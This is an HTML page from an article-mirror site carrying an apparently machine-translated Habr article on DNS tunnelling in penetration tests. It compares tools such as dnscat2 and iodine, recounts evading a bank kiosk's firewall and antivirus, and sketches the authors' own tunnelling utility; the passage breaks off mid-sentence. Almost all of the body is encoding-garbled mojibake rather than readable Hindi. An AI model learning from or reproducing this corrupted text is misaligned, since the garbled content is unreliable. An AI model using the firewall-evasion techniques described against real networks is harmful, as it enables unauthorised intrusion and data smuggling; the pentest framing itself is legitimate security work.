<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ЁЯЦия╕П ЁЯд▒ ЁЯОа рд╕реБрд░рдВрдЧ рдпрд╛ DNS рдХреЗ рдЕрдВрдд рдореЗрдВ рдкреЗрдиреНрдЯрд╕реНрдЯ рдореЗрдВ рдЯреНрд░реИрдлрд╝рд┐рдХ ЁЯФ╖ ЁЯдЭ ЁЯНл</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="рдирдорд╕реНрддреЗ! рдкреИрда рдкрд░реАрдХреНрд╖рдг рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдореЗрдВ, рд╣рдо рдЕрдХреНрд╕рд░ рд╣рд╛рд░реНрдб-рд╕реЗрдЧрдореЗрдВрдЯ рд╡рд╛рд▓реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдмрд╛рд╣рд░реА рджреБрдирд┐рдпрд╛ рд╕реЗ рд▓рдЧрднрдЧ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд▓рдЧ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред рдХрднреА-рдХрднреА...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>рд╕реБрд░рдВрдЧ рдпрд╛ DNS рдХреЗ рдЕрдВрдд рдореЗрдВ рдкреЗрдиреНрдЯрд╕реНрдЯ рдореЗрдВ рдЯреНрд░реИрдлрд╝рд┐рдХ</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  рдирдорд╕реНрддреЗ!  рдкреИрда рдкрд░реАрдХреНрд╖рдг рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдореЗрдВ, рд╣рдо рдЕрдХреНрд╕рд░ рд╣рд╛рд░реНрдб-рд╕реЗрдЧрдореЗрдВрдЯ рд╡рд╛рд▓реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдмрд╛рд╣рд░реА рджреБрдирд┐рдпрд╛ рд╕реЗ рд▓рдЧрднрдЧ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд▓рдЧ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред  рдХрднреА-рдХрднреА, рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЗрд╡рд▓ рдЙрдкрд▓рдмреНрдз рдкреНрд░реЛрдЯреЛрдХреЙрд▓ - DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред  рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ, рд╣рдо рдЖрдкрдХреЛ рдмрддрд╛рдПрдВрдЧреЗ рдХрд┐ 2018 рдореЗрдВ рдЗрд╕реА рддрд░рд╣ рдХреА рд╕рдорд╕реНрдпрд╛ рдХреЛ рдХреИрд╕реЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреНрдпрд╛ рдиреБрдХрд╕рд╛рди рд╣реБрдП рд╣реИрдВред  рд▓реЛрдХрдкреНрд░рд┐рдп рдЙрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХреА рднреА рд╕рдореАрдХреНрд╖рд╛ рдХреА рдЬрд╛рдПрдЧреА рдФрд░ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдУрдкрди-рд╕реЛрд░реНрд╕ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреА рдПрдХ рд░рд┐рд▓реАрдЬрд╝ рдХреЛ рдЙрди рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рдирдХреА рдЖрдорддреМрд░ рдкрд░ рдореМрдЬреВрджрд╛ рд╕рдорд╛рди рдЙрдкрдХрд░рдгреЛрдВ рдХреА рдХрдореА рд╣реИред </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  DNS рд╕реБрд░рдВрдЧреЗрдВ рдХреНрдпрд╛ рд╣реИрдВ </h1><br><p>  рд╣реИрдмреЗ рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХрдИ</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд▓реЗрдЦ рд╣реИрдВ</a> рдЬреЛ рдмрддрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдбреАрдПрдирдПрд╕ рд╕реБрд░рдВрдЧрд┐рдВрдЧ рдХреНрдпрд╛ рд╣реИред  рд╣рд╛рд▓рд╛рдВрдХрд┐, рдбреАрдПрдирдПрд╕ рдЯрдирд▓рд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдереЛрдбрд╝рд╛ рд╕рд┐рджреНрдзрд╛рдВрдд рд╕реНрдкреЙрдЗрд▓рд░ рдХреЗ рдиреАрдЪреЗ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </p><br><div class="spoiler">  <b class="spoiler_title">DNS рдЯрдирд▓рд┐рдВрдЧ рдХреНрдпрд╛ рд╣реИ?</b> <div class="spoiler_text"><p>  рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдкрд╣реБрдВрдЪ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рджреНрд╡рд╛рд░рд╛ рдХрд╕рдХрд░ рдХрд╛рдЯ рджреА рдЬрд╛рддреА рд╣реИ, рдФрд░ рдЖрдкрдХреЛ рдбреЗрдЯрд╛ рдХреЛ рдмрд╣реБрдд рдмреБрд░реА рддрд░рд╣ рд╕реЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдФрд░ рдлрд┐рд░ DNS рдЯрдирд▓рд┐рдВрдЧ рддрдХрдиреАрдХ рдмрдЪрд╛рд╡ рдХреЗ рд▓рд┐рдП рдЖрддреА рд╣реИред </p><br><p>  рдЖрд░реЗрдЦ рдореЗрдВ, рд╕рдм рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  DNS рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реАрдЬрд╝, рдпрд╣рд╛рдВ рддрдХ тАЛтАЛрдХрд┐ рд╕рдмрд╕реЗ рдХрдареЛрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде, рдХрднреА-рдХрднреА рдЕрднреА рднреА рдЧреБрдЬрд░рддреА рд╣реИрдВ, рдФрд░ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рджреВрд╕рд░реА рддрд░рдл рд╕реНрдерд┐рдд рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдЙрддреНрддрд░ рджреЗрдХрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред  рд╕рдВрдЪрд╛рд░ рдмреЗрд╣рдж рдзреАрдорд╛ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рд╕рдВрдЧрдарди рдХреЗ рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рднреЗрджрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рдпрд╛, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╡рд┐рджреЗрд╢реЛрдВ рдореЗрдВ рднреБрдЧрддрд╛рди рдХрд┐рдП рдЧрдП рд╡рд╛рдИ-рдлрд╛рдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдХрд╛ рддрддреНрдХрд╛рд▓ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  рдЬреЛ рдЗрд╕ рд╕рдордп рд▓реЛрдХрдкреНрд░рд┐рдп рд╣реИ </h1><br><p>  рдЕрдм рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЙрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ - рдкреНрд░рддреНрдпреЗрдХ рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдФрд░ рдмрдЧ рдХреЗ рд╕рд╛рдеред  рд╣рдордиреЗ рддреБрд▓рдирд╛рддреНрдордХ рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдкрд╛рдВрдЪ рд╕рдмрд╕реЗ рд▓реЛрдХрдкреНрд░рд┐рдп рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛: </p><br><ul><li>  dnscat2 </li><li>  рдЖрдпреЛрдбреАрди </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  рдЖрдк рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдордиреЗ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд╣реИрдХрд░</a> рдкрд░ рдЕрдкрдиреЗ рд▓реЗрдЦ рдореЗрдВ рдЙрдирдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХреИрд╕реЗ рдХрд┐рдпрд╛ред  рдпрд╣рд╛рдВ рд╣рдо рдХреЗрд╡рд▓ рдкрд░рд┐рдгрд╛рдо рджреЗрддреЗ рд╣реИрдВред </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд░рд┐рдгрд╛рдореЛрдВ рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдкреНрд░рд╡реЗрд╢ рдкрд░реАрдХреНрд╖рдг рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдХрдорд┐рдпрд╛рдВ рд╣реИрдВ: </p><br><ul><li>  рд╕рдВрдХрд▓рд┐рдд рдЧреНрд░рд╛рд╣рдХ - рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╡рд╛рд▓реА рдорд╢реАрдиреЛрдВ рдкрд░ рджреНрд╡рд┐рдЖрдзрд╛рд░реА рдлрд╝рд╛рдЗрд▓ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рдЪреАрдЬрд╝ рдХреЛ рдЪрд▓рд╛рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ; </li><li>  рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рддрд╣рдд рдЕрд╕реНрдерд┐рд░ рдХрд╛рдо; </li><li>  рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред </li></ul><br><p>  рдЗрди рдХрдорд┐рдпреЛрдВ рдХреЗ рдХрд╛рд░рдг, рд╣рдореЗрдВ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЙрдкрдХрд░рдг рдХреЛ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА, рдФрд░ рдпрд╣ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдирд┐рдХрд▓рд╛ ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  рдЕрдкрдиреА рдЦреБрдж рдХреА DNS рдЯрдирд▓рд┐рдВрдЧ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдмрдирд╛рдПрдВ </h1><br><h2 id="predystoriya">  рдкреНрд░рд╛рдЧрд┐рддрд┐рд╣рд╛рд╕ </h2><br><p>  рдпрд╣ рд╕рдм рдПрдХ рдмреИрдВрдХ рдХреЗ рдЖрдВрддрд░рд┐рдХ рдкрдВрдЪрдХ рдХреЗ рджреМрд░рд╛рди рд╢реБрд░реВ рд╣реБрдЖред  рд▓реЙрдмреА рдореЗрдВ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХрдВрдкреНрдпреВрдЯрд░ рдерд╛ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рджрд╕реНрддрд╛рд╡реЗрдЬреЛрдВ, рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдФрд░ рдЕрдиреНрдп рдХрд╛рдЧрдЬрд╛рдд рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ред  рд╣рдорд╛рд░рд╛ рд▓рдХреНрд╖реНрдп: рд╡рд┐рдВрдбреЛрдЬ 7 рдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рд╕реЗ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдмреЛрд░реНрдб рдкрд░ Kaspersky рдПрдВрдЯреА-рд╡рд╛рдпрд░рд╕ рдерд╛ рдФрд░ рдХреЗрд╡рд▓ рдХреБрдЫ рдкреГрд╖реНрдареЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рдереА (рд▓реЗрдХрд┐рди рдЙрд╕реА рд╕рдордп DNS рдирд╛рдореЛрдВ рдХреЛ рд╣рд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛)ред </p><br><p>  рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдФрд░ рдХрд╛рд░ рд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдХрдИ рд╣рдорд▓реЗ рд╡реИрдХреНрдЯрд░ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдПред  рджреНрд╡рд┐рдЖрдзрд╛рд░реА рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдорд╢реАрди рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд╕рд╛рде рд░рд╛рд╕реНрддреЗ рдХреЛ рддреБрд░рдВрдд рдХрд┐рдирд╛рд░реЗ рдкрд░ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ "рдорд╣рд╛рди рдФрд░ рднрдпрд╛рдирдХ" "рдХреИрд╕реНрдкрд░реНрд╕рдХреА" рдиреЗ рддреБрд░рдВрдд рдЗрд╕рдХреЗ рдЙрдиреНрдореВрд▓рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрдм рдпрд╣ рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрддрд╛ рдЪрд▓рд╛ред  рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреА рдУрд░ рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдЕрд╡рд╕рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдХрд╛рдордпрд╛рдм рд░рд╣реЗ, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рд╡рд┐рдЪрд╛рд░реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ DNS рд╕реБрд░рдВрдЧ рдмрдирд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдереАред </p><br><p>  рд╕рдВрднрд╛рд╡рд┐рдд рддрд░реАрдХреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реБрдП, рд╣рдореЗрдВ dnscat2 рдХреЗ рд▓рд┐рдП PowerShell рдкрд░ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдорд┐рд▓рд╛ (рд╣рдордиреЗ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрд╣рд▓реЗ рд▓рд┐рдЦрд╛ рдерд╛)ред  рд▓реЗрдХрд┐рди рдЕрдВрдд рдореЗрдВ, рд╣рдо рдЬреЛ рдЕрдзрд┐рдХрддрдо рдЙрддреНрдкрд╛рджрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ, рд╡рд╣ рдереЛрдбрд╝реЗ рд╕рдордп рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдерд╛, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдЧреНрд░рд╛рд╣рдХ рджреБрд░реНрдШрдЯрдирд╛рдЧреНрд░рд╕реНрдд рд╣реЛ рдЧрдпрд╛ред </p><br><p>  рдпрд╣, рдЗрд╕реЗ рд╣рд▓реНрдХреЗ рдврдВрдЧ рд╕реЗ рдХрд╣рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдмрд╣реБрдд рдкрд░реЗрд╢рд╛рди рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдП рдЧрдП рдЧреНрд░рд╛рд╣рдХ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдмрд╕ рдЖрд╡рд╢реНрдпрдХ рдереАред  рджрд░рдЕрд╕рд▓, рдбреАрдПрдирдПрд╕ рдЯрдирд▓рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рдЕрдкрдиреЗ рдЯреВрд▓ рдХреЛ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдпрд╣ рдПрдХ рдХрд╛рд░рдг рдерд╛ред </p><br><h2 id="trebovaniya">  рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ </h2><br><p>  рдЦреБрдж рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реА рдореБрдЦреНрдп рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ: </p><br><ul><li>  рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ (рдЬрд╣рд╛рдБ рддрдХ рд╕рдВрднрд╡ рд╣реЛ) рдФрд░ рдпреВрдирд┐рдХреНрд╕ рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреАред  рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП, рдмреИрд╢ рдФрд░ рдкреЙрд╡рд░реНрд╕рд╢реЗрд▓ рдХреЛ рдХреНрд░рдорд╢рдГ рдЪреБрдирд╛ рдЧрдпрд╛ рдерд╛ред  рднрд╡рд┐рд╖реНрдп рдореЗрдВ, рдпреВрдирд┐рдХреНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд░реНрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдпреЛрдЬрдирд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ; </li><li>  рдХрд┐рд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛; </li><li>  рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдХрдИ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдердиред </li></ul><br><h2 id="arhitektura-proekta">  рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ </h2><br><p>  рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рд╣рдордиреЗ рд╡рд┐рдХрд╛рд╕ рд╢реБрд░реВ рдХрд┐рдпрд╛ред  рд╣рдорд╛рд░реЗ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ, рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдореЗрдВ 3 рднрд╛рдЧ рд╣реЛрддреЗ рд╣реИрдВ: рдЖрдВрддрд░рд┐рдХ рдорд╢реАрди рдкрд░ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ, рдПрдХ рдбреАрдПрдирдПрд╕ рд╕рд░реНрд╡рд░ рдФрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдбреАрдПрдирдПрд╕ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ рдЫреЛрдЯрд╛ рдкреНрд░реЙрдХреНрд╕реАред </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдордиреЗ TXT рд░рд┐рдХреЙрд░реНрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд░рдВрдЧ рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛ред </p><br><p>  рдСрдкрд░реЗрд╢рди рдХрд╛ рд╕рд┐рджреНрдзрд╛рдВрдд рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИ: </p><br><ul><li>  Pentester рдиреЗ рдПрдХ DNS рд╕рд░реНрд╡рд░ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ред </li><li>  рдПрдХ рдкрдВрдЪрд░ (рдпрд╛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛, рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЛ рдЖрдВрддрд░рд┐рдХ рдорд╢реАрди рдкрд░ рд▓реЙрдиреНрдЪ рдХрд░рддрд╛ рд╣реИред  рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдирд╛рдо рдФрд░ рдбреЛрдореЗрди рдЬреИрд╕реЗ рдРрд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИрдВ, рдФрд░ DNS рд╕рд░реНрд╡рд░ рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдХреЛ рд╕реАрдзреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рднреА рд╣реИред </li><li> рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ (рдПрдХ рдмрд╛рд╣рд░реА рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ) рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдпрд╣ DNS рд╕рд░реНрд╡рд░ рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рд╕рд╛рде рдкреЛрд░реНрдЯ рдЬрд╣рд╛рдВ рджрд╕реНрддрдХ рджреЗрдирд╛ рд╣реИ, рдЖрдИрдкреА рд▓рдХреНрд╖реНрдп (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ ssh рдЬрд╣рд╛рдВ рдЧреНрд░рд╛рд╣рдХ рдмреИрдареЗ рд╣реИрдВ) рдФрд░, рддрджрдиреБрд╕рд╛рд░, рд▓рдХреНрд╖реНрдп рдкреЛрд░реНрдЯред  рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕реЗ <code>--clients</code> рдХреБрдВрдЬреА рдЬреЛрдбрд╝рдХрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </li><li>  рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдиреЗ рд╕реНрдерд╛рдиреАрдп рд╣рд┐рдд рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдХреНрд╕реА рдкреЛрд░реНрдЯ рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░рддреЗ рд╣реБрдП, рдЙрдирдХреЗ рд▓рд┐рдП рд░реБрдЪрд┐ рдХреЗ 